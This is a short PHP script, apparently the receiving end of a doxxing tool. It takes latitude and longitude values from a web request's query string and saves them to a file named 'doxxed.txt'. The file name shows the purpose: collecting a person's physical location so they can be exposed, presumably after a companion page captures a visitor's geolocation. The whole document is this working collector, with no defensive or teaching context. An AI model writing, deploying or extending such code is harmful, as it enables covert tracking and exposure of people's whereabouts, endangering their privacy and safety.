<?php
$myfile = fopen("doxxed.txt", "w");
$txt = "Latitude: " . $_GET["lat"] . "\nLongitude: " . $_GET["long"];
fwrite($myfile, $txt);
fclose($myfile);

?>
